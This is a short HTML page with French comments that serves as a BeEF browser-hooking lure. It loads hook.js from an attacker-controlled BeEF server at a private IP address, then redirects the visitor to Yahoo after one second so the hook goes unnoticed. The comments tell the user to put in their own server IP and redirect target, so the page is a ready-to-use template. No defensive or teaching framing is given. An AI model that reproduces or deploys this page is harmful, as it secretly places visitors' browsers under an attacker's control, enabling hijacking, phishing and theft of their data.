<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Hook BeEF avec redirection rapide</title>

    <!-- Script du hook BeEF -->
    <script src="https://192.168.86.139:3000/hook.js"></script> <!-- Remplace par l'IP de ton serveur BeEF -->

    <!-- Script pour rediriger l'utilisateur après 1 seconde -->
    <script>
      // Redirection après 1 seconde
      setTimeout(function(){
        window.location.href = "https://fr.yahoo.com";  // Remplace avec l'URL de redirection
      }, 1000);  // Délai de 1000 ms (1 seconde)
    </script>
</head>
<body>
    <h1>Vous serez redirigé sous peu...</h1>
    <p>Veuillez patienter, redirection en cours...</p>
</body>
</html>
